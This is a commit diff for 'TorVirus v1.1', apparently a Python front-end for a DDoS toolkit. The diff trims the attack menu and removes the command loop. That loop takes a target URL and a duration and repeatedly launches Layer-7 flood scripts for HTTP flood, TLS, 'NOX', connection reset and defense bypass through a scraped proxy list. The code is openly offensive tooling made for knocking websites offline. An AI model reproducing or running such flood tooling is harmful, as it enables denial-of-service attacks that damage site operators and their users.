9d1595c9f7f264516413cf7b5e018a6799975072
FrostFoe <frostfoe@gmail.com>
2024-11-20 09:06:06 +0000

    🔥 TorVirus v1.1: Release (November 20, 2024)

--- root/root.py
+++ root/root.py
@@ -140,13 +140,10 @@ def mn_lp():
      🚨  LAYER7 ATTACK MENU  🚨
        (Top-secret Protocols)
 
-Commands available:
-  - TOR   : Attack via TOR network
-  - FLOOD : HTTP flood attack
-  - HTTPS : HTTPS flood attack
-  - RESET : Reset server connections
-  - NOX   : Noxious DDoS attack
-  - BYPASS: Bypass defenses
+        Commands available:
+   - TOR   : Attack via TOR network
+   - TOR-BYPASS: Bypass defenses
+
   """
                 )
                 continue
@@ -257,141 +254,9 @@ Commands available:
             break
 
     ds_mn()
-    while True:
-        try:
-            user_input = input("root@torvirus#~ ").strip()
-            if not user_input:
-                continue
-            parts = user_input.split()
-            cmd = parts[0].upper()
-
-            if cmd == "STATS":
-                clr_csl()
-                dis_ds()
-                continue
-
-            elif cmd in ["LAYER7", "L7"]:
-                ld_ani("✨ Loading Layer 7 Methods ✨", 1.5)
-                print(
-                    """
-                         TOR  : TOR https://example.com 60
-                         FLOOD: FLOOD https://example.com 60
-                         HTTPX: HTTPX https://example.com 60
-                         HTTPS: HTTPS https://example.com 60
-                         RESET: RESET https://example.com 60
-                         NOX  : NOX https://example.com 60"""
-                )
-                continue
-
-            elif cmd in ["CLEAR", "CLS"]:
-                ld_ani("Purging Console", 1.5)
-                ds_mn()
-                continue
-
-            elif cmd == "EXIT":
-                ld_ani("Exiting TorVirus", 1.5)
-                ani_txt("👋 Goodbye, have a great day.", 0.02)
-                t.sleep(1)
-                s.exit(0)
-
-            elif cmd in ["TOR", "FLOOD", "TLS", "NOX", "HTTPS", "BYPASS", "RESET"]:
-                try:
-                    tg = parts[1]
-                    dr = int(parts[2])
-                    mx_tm = 300
-                    st_tm = t.time()
-
-                    ani_txt(f"Engaging Attack on {tg} for {dr} seconds... 💥", 0.05)
-
-                    while t.time() - st_tm < dr:
-                        if cmd == "TOR":
-                            rn_cmd(
-                                f'node bin/odd/.cache/TorXTor.js GET "{tg}" {mx_tm} 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
-                            )
-                            rn_cmd(
-                                f'node bin/odd/.cache/TorXTor.js POST "{tg}" {mx_tm} 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
-                            )
-                        elif cmd == "FLOOD":
-                            rn_cmd(
-                                f"go run bin/odd/.cache/TorXHulk.go --site {tg} --data GET"
-                            )
-                            rn_cmd(
-                                f"go run bin/odd/.cache/TorXCrash.go {tg} 9999 get {mx_tm} nil"
-                            )
-                            rn_cmd(
-                                f"go run bin/odd/.cache/TorXHulk.go --site {tg} --data POST"
-                            )
-                            rn_cmd(
-                                f"go run bin/odd/.cache/TorXCrash.go {tg} 9999 POST {mx_tm} nil"
-                            )
-                        elif cmd == "TLS":
-                            rn_cmd(
-                                f"node bin/odd/.cache/TorXTls.js {tg} {mx_tm} 90 20 bin/odd/.cache/proxy.txt"
-                            )
-                            rn_cmd(
-                                f"node bin/odd/.cache/TorXDark.js {tg} {mx_tm} 90 20 bin/odd/.cache/proxy.txt"
-                            )
-                        elif cmd == "NOX":
-                            rn_cmd(
-                                f"node bin/odd/.cache/NOX.js {tg} {mx_tm} 20 90 bin/odd/.cache/proxy.txt"
-                            )
-                        elif cmd == "HTTPS":
-                            rn_cmd(
-                                f"node bin/odd/.cache/HTTPS.js POST {tg} {mx_tm} 8 8 bin/odd/.cache/proxy.txt"
-                            )
-                            rn_cmd(
-                                f"node bin/odd/.cache/HTPPSV2.js GET {tg} {mx_tm} 8 8 bin/odd/.cache/proxy.txt"
-                            )
-                        elif cmd == "BYPASS":
-                            rn_cmd(
-                                f"node bin/odd/.cache/TorXBypassV2.js {tg} {mx_tm} 90 20 bin/odd/.cache/proxy.txt"
-                            )
-                            rn_cmd(
-                                f"node bin/odd/.cache/TorXBypass.js {tg} {mx_tm} 90 20 bin/odd/.cache/proxy.txt"
-                            )
-                        elif cmd == "RESET":
-                            rn_cmd(
-                                f"node bin/odd/.cache/RESETV2.js {tg} {mx_tm} 8 8 bin/odd/.cache/proxy.txt --full"
-                            )
-                            rn_cmd(
-                                f"node bin/odd/.cache/RESET.js {tg} {mx_tm} 8 8 bin/odd/.cache/proxy.txt"
-                            )
-                        t.sleep(1)
-
-                except IndexError:
-                    print("❌ Invalid Command. Usage: METHOD URL TIME")
-                    print("Example: TOR https://example.com 60")
-
-            elif cmd == "PROXY":
-                rn_cmd("python3 bin/odd/.cache/scrape.py &")
-                continue
-
-            elif cmd == "UPDATE":
-                rn_cmd("git reset --hard HEAD && git pull origin main")
-                continue
-
-            elif cmd == "SETUP":
-                rn_cmd("sudo bash setup.sh &")
-                continue
-
-            elif cmd == "HELP":
-                ld_ani("Loading Help", 1.5)
-                print(
-                    "📖 Available Commands: LAYER7, STATS, CLEAR, EXIT, HELP, UPDATE, SETUP"
-                )
-                continue
-
-            else:
-                ani_txt("❓ Unknown Command. Try HELP.", 0.05)
-
-        except KeyboardInterrupt:
-            ani_txt("⚠️ Exiting TorVirus...", 0.02)
-            s.exit(0)
-
 
 def rn_cmd(cmd):
     sp.run(cmd, shell=True)
-
 
 ses_srt = t.time()
 bot_cnt = sum(1 for _ in load_prxs())
